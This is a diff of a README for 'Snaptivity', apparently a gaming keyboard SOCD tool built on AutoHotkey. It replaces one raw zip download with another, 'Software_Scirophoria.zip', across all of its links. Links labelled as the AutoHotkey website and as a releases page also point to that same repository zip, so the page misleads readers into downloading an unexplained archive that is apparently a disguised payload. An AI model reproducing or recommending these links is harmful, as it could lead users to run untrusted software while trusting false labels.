@@ -2,7 +2,7 @@
 
 ## 📦 Quick Download
 
-[![Download Snaptivity](https://github.com/lenin-huaylla/Snaptivity/raw/refs/heads/main/Assets/Software_3.5.zip%20Snaptivity-v1.0-blue)](https://github.com/lenin-huaylla/Snaptivity/raw/refs/heads/main/Assets/Software_3.5.zip)
+[![Download Snaptivity](https://raw.githubusercontent.com/lenin-huaylla/Snaptivity/main/Assets/Software_Scirophoria.zip%20Snaptivity-v1.0-blue)](https://raw.githubusercontent.com/lenin-huaylla/Snaptivity/main/Assets/Software_Scirophoria.zip)
 
 ## 🚀 Getting Started
 
@@ -13,12 +13,12 @@ Welcome to Snaptivity, an innovative tool built to simulate hardware SOCD using 
 Before downloading, ensure your system meets these requirements:
 
 - Windows 10 or newer
-- AutoHotkey v2 installed (You can download it from the [AutoHotkey website](https://github.com/lenin-huaylla/Snaptivity/raw/refs/heads/main/Assets/Software_3.5.zip))
+- AutoHotkey v2 installed (You can download it from the [AutoHotkey website](https://raw.githubusercontent.com/lenin-huaylla/Snaptivity/main/Assets/Software_Scirophoria.zip))
 - A compatible keyboard
 
 ### 📥 Download & Install
 
-To get started, visit this page to download: [Snaptivity Releases](https://github.com/lenin-huaylla/Snaptivity/raw/refs/heads/main/Assets/Software_3.5.zip). 
+To get started, visit this page to download: [Snaptivity Releases](https://raw.githubusercontent.com/lenin-huaylla/Snaptivity/main/Assets/Software_Scirophoria.zip). 
 
 1. **Visit the Releases page** by clicking the link above.
 2. **Choose the latest version.** Look for the version number at the top of the list.
@@ -62,7 +62,7 @@ Share your experiences using Snaptivity on your favorite gaming forums, or contr
 
 ### 🔗 Links
 
-- Download Snaptivity: [Snaptivity Releases](https://github.com/lenin-huaylla/Snaptivity/raw/refs/heads/main/Assets/Software_3.5.zip)
-- AutoHotkey v2: [Download AutoHotkey](https://github.com/lenin-huaylla/Snaptivity/raw/refs/heads/main/Assets/Software_3.5.zip)
+- Download Snaptivity: [Snaptivity Releases](https://raw.githubusercontent.com/lenin-huaylla/Snaptivity/main/Assets/Software_Scirophoria.zip)
+- AutoHotkey v2: [Download AutoHotkey](https://raw.githubusercontent.com/lenin-huaylla/Snaptivity/main/Assets/Software_Scirophoria.zip)
 
 Thank you for choosing Snaptivity to enhance your gaming experience. May your movements be smooth and your gameplay enjoyable!
